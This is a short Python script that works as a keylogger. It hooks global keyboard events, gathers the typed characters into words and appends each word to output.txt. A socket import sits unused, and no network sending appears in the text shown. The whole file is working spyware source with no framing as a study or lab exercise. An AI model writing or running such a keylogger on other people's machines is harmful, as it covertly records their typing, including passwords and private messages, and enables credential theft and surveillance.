from colorama import Fore, Style
import argparse
import keyboard
import socket
import sys
import os


# colors
green = Fore.GREEN
reset = Style.RESET_ALL

word = ""

def reset_word():
    global word
    word = ""

def save_word():
    with open("output.txt", "a") as file:
        file.write(word + "\n")
    print(f'Word saved: {green}{word}{reset}')
    reset_word()

def press_key(keystroke):
    global word

    if keystroke.event_type == keyboard.KEY_DOWN:
        if keystroke.name == 'space':
            save_word()
        elif len(keystroke.name) == 1 and keystroke.name.isprintable():
            word += keystroke.name

keyboard.hook(press_key)






